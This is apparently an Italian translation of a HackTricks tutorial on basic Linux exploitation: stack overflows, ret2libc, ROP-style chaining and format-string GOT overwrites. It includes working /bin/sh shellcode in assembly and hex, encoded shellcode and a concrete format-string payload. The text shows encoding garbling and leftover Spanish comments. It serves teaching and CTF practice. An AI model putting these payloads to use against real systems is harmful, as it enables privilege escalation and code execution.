# Linux Exploiting (Basic) (ITA)

<details>

<summary><strong>Impara l'hacking su AWS da zero a ero con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **1.STACK OVERFLOWS**

> buffer overflow, buffer overrun, stack overrun, stack smashing

Segmentation fault o violazione di segmento: Quando si tenta di accedere a un indirizzo di memoria non assegnato al processo.

Per ottenere l'indirizzo di una funzione all'interno di un programma si pu√≤ fare:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Chiamata a sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

View kernel interrupts: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; clear eax\
xor ebx, ebx ; ebx = 0 as there are no arguments to pass\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Execute syscall

**nasm -f elf assembly.asm** ‚Äî> Returns a .o file\
**ld assembly.o -o shellcodeout** ‚Äî> Generates an executable with the assembly code and we can extract the opcodes with **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> To verify that it is indeed our shellcode and extract the OpCodes

**Verify that the shellcode works**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Per verificare che le system call vengano eseguite correttamente, √® necessario compilare il programma precedente e le system call dovrebbero apparire in **strace ./PROGRAMMA_COMPILATO**

Quando si creano shellcode, si pu√≤ utilizzare un trucco. La prima istruzione √® un salto a una chiamata. La chiamata richiama il codice originale e inserisce l'EIP nello stack. Dopo l'istruzione di chiamata, abbiamo inserito la stringa necessaria, quindi con quel EIP possiamo puntare alla stringa e continuare ad eseguire il codice.

ESEMPIO **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**Esempio di utilizzo dello Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Cacciatore di Uova:**

Si tratta di un breve codice che scorre le pagine di memoria associate a un processo alla ricerca della shellcode ivi memorizzata (cerca una firma inserita nella shellcode). Utile nei casi in cui si dispone solo di uno spazio limitato per iniettare codice.

**Shellcode Polimorfiche**

Sono shell cifrate che contengono brevi codici che le decrittano e saltano ad esse, utilizzando il trucco di Call-Pop, questo sarebbe un **esempio di cifratura di Cesare**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **Attaccare il Frame Pointer (EBP)**

Utile in una situazione in cui possiamo modificare l'EBP ma non l'EIP.

Si sa che quando si esce da una funzione, viene eseguito il seguente codice assembly:
```
movl               %ebp, %esp
popl                %ebp
ret
```
In questo modo, √® possibile modificare l'EBP uscendo da una funzione (fvuln) chiamata da un'altra funzione, in modo che quando la funzione che ha chiamato fvuln termina, il suo EIP pu√≤ essere modificato.

In fvuln √® possibile inserire un EBP falso che punti a un luogo dove si trova l'indirizzo della shellcode + 4 (bisogna aggiungere 4 per il pop). Quindi, uscendo dalla funzione, il valore di &(\&Shellcode)+4 verr√† inserito in ESP, con il pop verranno sottratti 4 a ESP e punter√† all'indirizzo della shellcode quando verr√† eseguito il ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + padding + &(\&Shellcode)+4

**Exploit Off-by-One**\
Permette di modificare solo il byte meno significativo dell'EBP. Si pu√≤ eseguire un attacco simile a quello precedente, ma la memoria che contiene l'indirizzo della shellcode deve condividere i primi 3 byte con l'EBP.

## **4. Metodi return to Libc**

Metodo utile quando lo stack non √® eseguibile o lascia un buffer troppo piccolo da modificare.

L'ASLR fa s√¨ che ad ogni esecuzione le funzioni vengano caricate in posizioni diverse della memoria. Pertanto, questo metodo potrebbe non essere efficace in quel caso. Per server remoti, poich√© il programma viene eseguito costantemente allo stesso indirizzo, pu√≤ essere utile.

* **cdecl(C declaration)** Mette gli argomenti nello stack e pulisce lo stack dopo l'uscita dalla funzione
* **stdcall(standard call)** Mette gli argomenti nello stack e la funzione chiamata pulisce lo stack
* **fastcall** Mette i primi due argomenti nei registri e il resto nello stack

Si inserisce l'indirizzo dell'istruzione system di libc e si passa come argomento la stringa "/bin/sh", di solito da una variabile di ambiente. Inoltre, si utilizza l'indirizzo della funzione exit in modo che una volta terminata l'esecuzione della shell, il programma esca senza problemi (e scriva i log).

**export SHELL=/bin/sh**

Per trovare gli indirizzi di cui abbiamo bisogno, si pu√≤ guardare dentro a **GDB:**\
**p system**\
**p exit**\
**rabin2 -i eseguibile** ‚Äî> Restituisce l'indirizzo di tutte le funzioni utilizzate dal programma al momento del caricamento\
(Dentro a un start o un breakpoint): **x/500s $esp** ‚Äî> Cerchiamo qui la stringa /bin/sh

Una volta ottenuti questi indirizzi, l'**exploit** sar√†:

"A" \* DISTANZA EBP + 4 (EBP: possono essere 4 "A" anche se √® meglio se √® l'EBP reale per evitare errori di segmentazione) + Indirizzo di **system** (sovrascriver√† l'EIP) + Indirizzo di **exit** (dopo system(‚Äú/bin/sh‚Äù) questa funzione verr√† chiamata poich√© i primi 4 byte dello stack sono trattati come l'indirizzo successivo dell'EIP da eseguire) + Indirizzo di ‚Äú**/bin/sh**‚Äù (sar√† il parametro passato a system)

In questo modo, l'EIP verr√† sovrascritto con l'indirizzo di system che ricever√† come parametro la stringa ‚Äú/bin/sh‚Äù e al termine di questa eseguir√† la funzione exit().

√à possibile trovarsi nella situazione in cui un byte di un indirizzo di una funzione sia nullo o uno spazio (\x20). In tal caso, √® possibile disassemblare gli indirizzi precedenti a tale funzione poich√© probabilmente ci saranno diversi NOP che ci permetteranno di chiamare uno di essi anzich√© la funzione direttamente (ad esempio con > x/8i system-4).

Questo metodo funziona perch√© chiamando una funzione come system usando l'opcode **ret** anzich√© **call**, la funzione capisce che i primi 4 byte saranno l'indirizzo **EIP** a cui tornare.

Una tecnica interessante con questo metodo √® chiamare **strncpy()** per spostare un payload dallo stack all'heap e successivamente utilizzare **gets()** per eseguire tale payload.

Un'altra tecnica interessante √® l'uso di **mprotect()** che consente di assegnare i permessi desiderati a qualsiasi parte della memoria. Funziona o funzionava in BDS, MacOS e OpenBSD, ma non in Linux (controlla che non sia possibile concedere contemporaneamente permessi di scrittura ed esecuzione). Con questo attacco si potrebbe rendere di nuovo eseguibile lo stack.

**Concatenazione di funzioni**

Basandosi sulla tecnica precedente, questa forma di exploit consiste in:\
Padding + \&Funzione1 + \&pop;ret; + \&arg\_fun1 + \&Funzione2 + \&pop;ret; + \&arg\_fun2 + ‚Ä¶

In questo modo √® possibile concatenare le funzioni da chiamare. Inoltre, se si vogliono utilizzare funzioni con pi√π argomenti, √® possibile inserire gli argomenti necessari (ad esempio 4) e inserire i 4 argomenti e cercare un indirizzo con gli opcode: pop, pop, pop, pop, ret ‚Äî> **objdump -d eseguibile**

**Concatenazione tramite falsificazione di frame (concatenamento di EBPs)**

Consiste nel sfruttare la possibilit√† di manipolare l'EBP per concatenare l'esecuzione di varie funzioni attraverso l'EBP e "leave;ret"

PADDING

* Si imposta sull'EBP un EBP falso che punta a: 2¬∞ EBP\_falso + la funzione da eseguire: (\&system() + \&leave;ret + &‚Äú/bin/sh‚Äù)
* Nell'EIP si inserisce come indirizzo una funzione &(leave;ret)

Si avvia la shellcode con l'indirizzo della parte successiva della shellcode, ad esempio: 2¬∞EBP\_falso + \&system() + &(leave;ret;) + &‚Äù/bin/sh‚Äù

il 2¬∞EBP sarebbe: 3¬∞EBP\_falso + \&system() + &(leave;ret;) + &‚Äù/bin/ls‚Äù

Questa shellcode pu√≤ essere ripetuta indefinitamente nelle parti di memoria a cui si ha accesso in modo da ottenere una shellcode facilmente divisibile in piccoli pezzi di memoria.

(Si concatenano le esecuzioni di funzioni mescolando le vulnerabilit√† viste in precedenza di EBP e di ret2lib)

## **5. Metodi complementari**

**Ret2Ret**

Utile quando non √® possibile inserire un indirizzo dello stack nell'EIP (si controlla che l'EIP non contenga 0xbf) o quando non √® possibile calcolare la posizione della shellcode. Tuttavia, la funzione vulnerabile accetta un parametro (la shellcode andr√† qui).

In questo modo, cambiando l'EIP con un indirizzo a un **ret**, verr√† caricato l'indirizzo successivo (che √® l'indirizzo del primo argomento della funzione). In altre parole, verr√† caricata la shellcode.

L'exploit sarebbe: SHELLCODE + Padding (fino a EIP) + **\&ret** (i byte successivi dello stack puntano all'inizio della shellcode poich√© viene inserito nello stack l'indirizzo del parametro passato)

Sembra che funzioni come **strncpy** una volta completate rimuovano dalla pila l'indirizzo in cui era memorizzata la shellcode, impedendo questa tecnica. In altre parole, l'indirizzo passato alla funzione come argomento (quello che contiene la shellcode) viene modificato con un 0x00, quindi al secondo **ret** si trova un 0x00 e il programma si arresta.
```
**Ret2PopRet**
```
**Tecnica di Murat**

In Linux, tutti i programmi vengono mappati a partire da 0xbfffffff.

Guardando come viene costruito lo stack di un nuovo processo in Linux, √® possibile sviluppare uno sfruttamento in modo che il programma venga avviato in un ambiente in cui l'unica variabile sia lo shellcode. L'indirizzo di questa variabile pu√≤ quindi essere calcolato come: addr = 0xbfffffff - 4 - strlen(NOME\_eseguibile\_completo) - strlen(shellcode)

In questo modo si otterrebbe facilmente l'indirizzo in cui si trova la variabile di ambiente con lo shellcode.

Ci√≤ √® possibile grazie alla funzione execle che consente di creare un ambiente con solo le variabili di ambiente desiderate.

**Salto a ESP: Stile Windows**

Poich√© ESP punta sempre all'inizio dello stack, questa tecnica consiste nel sostituire l'EIP con l'indirizzo di una chiamata a **jmp esp** o **call esp**. In questo modo, la shellcode viene salvata dopo la sovrascrittura dell'EIP poich√© dopo l'esecuzione del **ret**, ESP punter√† all'indirizzo successivo, proprio dove √® stata salvata la shellcode.

Nel caso in cui l'ASLR non sia attivo su Windows o Linux, √® possibile chiamare **jmp esp** o **call esp** memorizzate in qualche oggetto condiviso. Se l'ASLR √® attivo, potrebbe essere cercato all'interno del programma vulnerabile stesso.

Inoltre, il fatto di poter posizionare la shellcode dopo la corruzione dell'EIP anzich√© nel mezzo dello stack consente alle istruzioni push o pop eseguite nel mezzo della funzione di non toccare la shellcode (cosa che potrebbe accadere se fosse posizionata nel mezzo dello stack della funzione).

In modo molto simile a questo, se si sa che una funzione restituisce l'indirizzo in cui √® memorizzata la shellcode, √® possibile chiamare **call eax** o **jmp eax (ret2eax).**

**Integer overflows**

Questo tipo di overflow si verifica quando una variabile non √® in grado di gestire un numero cos√¨ grande come quello passato, probabilmente a causa di una confusione tra variabili con e senza segno, ad esempio:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Nell'esempio precedente vediamo che il programma si aspetta 2 parametri. Il primo √® la lunghezza della stringa successiva e il secondo √® la stringa.

Se passiamo un numero negativo come primo parametro, verr√† visualizzato che len < 256 e passeremo quel filtro, e inoltre anche strlen(buffer) sar√† minore di l, poich√© l √® unsigned int e sar√† molto grande.

Questo tipo di overflow non cerca di scrivere qualcosa nel processo del programma, ma di superare filtri mal progettati per sfruttare altre vulnerabilit√†.

**Variabili non inizializzate**

Non si conosce il valore che pu√≤ assumere una variabile non inizializzata e potrebbe essere interessante osservarlo. Potrebbe assumere il valore che aveva una variabile della funzione precedente e questa potrebbe essere controllata dall'attaccante.

## **Stringhe di formato**

In C **`printf`** √® una funzione che pu√≤ essere utilizzata per **stampare** una stringa. Il **primo parametro** che questa funzione si aspetta √® il **testo grezzo con i formattatori**. I **parametri successivi** previsti sono i **valori** da **sostituire** ai **formattatori** del testo grezzo.

La vulnerabilit√† si manifesta quando un **testo dell'attaccante viene inserito come primo argomento** a questa funzione. L'attaccante sar√† in grado di creare un **input speciale sfruttando** le **capacit√† di formattazione della stringa di formato printf** per **scrivere qualsiasi dato in qualsiasi indirizzo**. Essendo in grado in questo modo di **eseguire codice arbitrario**.

Formattatori:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **scrive** il **numero di byte scritti** nell'**indirizzo indicato. Scrivere** tanti **byte** quanti il numero esadecimale che dobbiamo **scrivere** √® il modo in cui √® possibile **scrivere qualsiasi dato**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

Questa √® la tabella che contiene l'**indirizzo** delle **funzioni esterne** utilizzate dal programma.

Ottieni l'indirizzo di questa tabella con: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Osserva come dopo **caricare** l'**eseguibile** in GEF puoi **vedere** le **funzioni** che sono nel **GOT**: `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Utilizzando GEF puoi **avviare** una **sessione di debug** ed eseguire **`got`** per vedere la tabella got:

![](<../../.gitbook/assets/image (621).png>)

In un binario il GOT ha gli **indirizzi delle funzioni o** della sezione **PLT** che caricher√† l'indirizzo della funzione. L'obiettivo di questo exploit √® **sovrascrivere l'ingresso GOT** di una funzione che verr√† eseguita successivamente **con** l'**indirizzo** del PLT della funzione **`system`**. Idealmente, si **sovrascriver√†** il **GOT** di una **funzione** che **verr√† chiamata con parametri controllati da te** (cos√¨ potrai controllare i parametri inviati alla funzione di sistema).

Se **`system`** **non viene utilizzato** dallo script, la funzione di sistema **non** avr√† un ingresso nel GOT. In questo scenario, dovrai **prima ottenere l'indirizzo** della funzione `system`.

La **Procedure Linkage Table** √® una tabella **solo lettura** nel file ELF che memorizza tutti i **simboli necessari che richiedono una risoluzione**. Quando una di queste funzioni viene chiamata, il **GOT** **reindirizzer√†** il **flusso** al **PLT** in modo che possa **risolvere** l'**indirizzo** della funzione e scriverlo nel GOT.\
Quindi, la **prossima volta** che viene effettuata una chiamata a quell'indirizzo, la **funzione** viene **chiamata direttamente** senza bisogno di risolverla.

Puoi vedere gli indirizzi PLT con **`objdump -j .plt -d ./vuln_binary`**

### **Flusso dell'Exploit**

Come spiegato in precedenza, l'obiettivo sar√† **sovrascrivere** l'**indirizzo** di una **funzione** nella tabella **GOT** che verr√† chiamata successivamente. Idealmente potremmo impostare l'**indirizzo su un codice shell** situato in una sezione eseguibile, ma √® molto probabile che non sarai in grado di scrivere un codice shell in una sezione eseguibile.\
Quindi un'opzione diversa √® **sovrascrivere** una **funzione** che **riceve** i suoi **argomenti** dall'**utente** e **puntarla** alla funzione **`system`**.

Per scrivere l'indirizzo, di solito vengono eseguiti 2 passaggi: **scrivi prima 2 byte** dell'indirizzo e poi gli altri 2. Per farlo si utilizza **`$hn`**.

**HOB** si riferisce ai 2 byte pi√π alti dell'indirizzo\
**LOB** si riferisce ai 2 byte pi√π bassi dell'indirizzo

Quindi, a causa del funzionamento delle stringhe di formato, √® necessario **scrivere prima il pi√π piccolo** tra \[HOB, LOB] e poi l'altro.

Se HOB < LOB\
`[indirizzo+2][indirizzo]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Se HOB > LOB\
`[indirizzo+2][indirizzo]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Template di Exploit delle Stringhe di Formato**

Puoi trovare un **template** per sfruttare il GOT utilizzando le stringhe di formato qui:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Essenzialmente si tratta di una struttura con le **funzioni che verranno chiamate** prima che il programma finisca. Questo √® interessante se puoi chiamare il tuo **codice shell saltando a un indirizzo**, o nei casi in cui devi tornare di nuovo a main per **sfruttare la stringa di formato una seconda volta**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Nota che questo **non** creer√† un **loop eterno** perch√© quando torni a main il canary si accorger√†, la fine dello stack potrebbe essere corrotta e la funzione non verr√† richiamata di nuovo. Quindi con questo sarai in grado di **avere 1 esecuzione in pi√π** della vulnerabilit√†.

### **Formattare le stringhe per Dumpare il Contenuto**

Una stringa di formato pu√≤ anche essere abusata per **dumpare il contenuto** dalla memoria del programma.\
Ad esempio, nella seguente situazione c'√® una **variabile locale nello stack che punta a una flag**. Se **trovi** dove in **memoria** si trova il **puntatore** alla **flag**, puoi fare in modo che **printf acceda** a quell'**indirizzo** e stampi la **flag**:

Quindi, la flag √® in **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

E dal leak puoi vedere che il **puntatore alla flag** √® nel **8¬∞** parametro:

![](<../../.gitbook/assets/image (623).png>)

Quindi, **accedendo** all'**8¬∞ parametro** puoi ottenere la flag:

![](<../../.gitbook/assets/image (624).png>)

Nota che seguendo l'**exploit precedente** e rendendoti conto che puoi **leakare il contenuto** puoi **impostare i puntatori** a **`printf`** nella sezione dove l'**eseguibile** √® **caricato** e **dumparlo** **interamente**!

### **DTOR**

{% hint style="danger" %}
Oggi √® molto **strano trovare un binario con una sezione dtor**.
{% endhint %}

I distruttori sono funzioni che vengono **eseguite prima che il programma finisca**.\
Se riesci a **scrivere** un **indirizzo** a uno **shellcode** in **`__DTOR_END__`**, questo verr√† **eseguito** prima che il programma finisca.\
Ottieni l'indirizzo di questa sezione con:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Di solito troverai la sezione **DTOR** **tra** i valori `ffffffff` e `00000000`. Quindi se vedi solo quei valori, significa che **non c'√® alcuna funzione registrata**. Quindi **sovrascrivi** il **`00000000`** con l'**indirizzo** dello **shellcode** per eseguirlo.

### **Stringhe di formato per gli overflow del buffer**

La funzione **sprintf** sposta una stringa formattata in una **variabile**. Quindi potresti abusare della **formattazione** di una stringa per causare un **overflow del buffer nella variabile** in cui il contenuto viene copiato.\
Ad esempio, il payload `%.44xAAAA` scriver√† **44B+"AAAA" nella variabile**, il che potrebbe causare un overflow del buffer.

### **Strutture \_\_atexit**

{% hint style="danger" %}
Oggi √® molto **strano sfruttare questo**.
{% endhint %}

**`atexit()`** √® una funzione a cui vengono passate **altre funzioni come parametri**. Queste **funzioni** verranno **eseguite** durante l'esecuzione di un **`exit()`** o al **ritorno** dal **main**.\
Se riesci a **modificare** l'**indirizzo** di una di queste **funzioni** per puntare a uno shellcode ad esempio, otterrai il **controllo** del **processo**, ma attualmente √® pi√π complicato.\
Attualmente gli **indirizzi delle funzioni** da eseguire sono **nascosti** dietro diverse strutture e infine l'indirizzo a cui puntano non sono gli indirizzi delle funzioni, ma sono **criptati con XOR** e spostamenti con una **chiave casuale**. Quindi attualmente questo vettore di attacco non √® molto utile almeno su x86 e x64\_86.\
La funzione di **criptazione** √® **`PTR_MANGLE`**. **Altre architetture** come m68k, mips32, mips64, aarch64, arm, hppa... **non implementano la funzione di crittografia** perch√© **restituisce lo stesso** che ha ricevuto in input. Quindi queste architetture potrebbero essere attaccabili tramite questo vettore.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Oggi √® molto **strano sfruttare questo**.
{% endhint %}

**`Setjmp()`** consente di **salvare** il **contesto** (i registri)\
**`longjmp()`** consente di **ripristinare** il **contesto**.\
I **registri salvati** sono: `EBX, ESI, EDI, ESP, EIP, EBP`\
Quello che succede √® che EIP e ESP vengono passati dalla funzione **`PTR_MANGLE`**, quindi le **architetture vulnerabili a questo attacco sono le stesse di prima**.\
Sono utili per il recupero degli errori o gli interrupt.\
Tuttavia, da quanto ho letto, gli altri registri non sono protetti, **quindi se c'√® una `call ebx`, `call esi` o `call edi`** all'interno della funzione chiamata, √® possibile prendere il controllo. Oppure potresti anche modificare EBP per modificare ESP.

**VTable e VPTR in C++**

Ogni classe ha una **Vtable** che √® un array di **puntatori a metodi**.

Ogni oggetto di una **classe** ha un **VPtr** che √® un **puntatore** all'array della sua classe. Il VPtr fa parte dell'intestazione di ogni oggetto, quindi se si riesce a **sovrascrivere** il **VPtr** potrebbe essere **modificato** per **puntare** a un metodo fittizio in modo che l'esecuzione di una funzione vada allo shellcode.

## **Misure preventive ed evasioni**

**Return-into-printf**

√à una tecnica per trasformare un buffer overflow in un errore di formato della stringa. Consiste nel sostituire l'EIP in modo che punti a un printf della funzione e passargli come argomento una stringa di formato manipolata per ottenere valori sullo stato del processo.

**Attacco alle librerie**

Le librerie si trovano in una posizione con 16 bit di casualit√† = 65636 possibili indirizzi. Se un server vulnerabile chiama fork(), lo spazio degli indirizzi di memoria viene clonato nel processo figlio e rimane intatto. Quindi si pu√≤ tentare un attacco di forza bruta alla funzione usleep() di libc passando "16" come argomento in modo che se impiega pi√π del normale a rispondere, si sar√† trovata tale funzione. Sapendo dove si trova tale funzione, √® possibile ottenere delta\_mmap e calcolare le altre.

L'unico modo per essere sicuri che l'ASLR funzioni √® utilizzare un'architettura a 64 bit. L√¨ non ci sono attacchi di forza bruta.

### Relro

**Relro (Read only Relocation)** influisce sulle autorizzazioni di memoria in modo simile a NX. La differenza √® che mentre con NX rende eseguibile lo stack, RELRO rende **alcune cose di sola lettura** quindi non possiamo scriverci. Il modo pi√π comune in cui ho visto che questo √® un ostacolo √® impedirci di fare un **sovrascrittura della tabella `got`**, che verr√† trattata in seguito. La tabella `got` contiene gli indirizzi delle funzioni libc in modo che il binario sappia quali sono gli indirizzi e possa chiamarli. Vediamo come sono le autorizzazioni di memoria per una voce della tabella `got` per un binario con e senza relro.

Con relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Senza relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
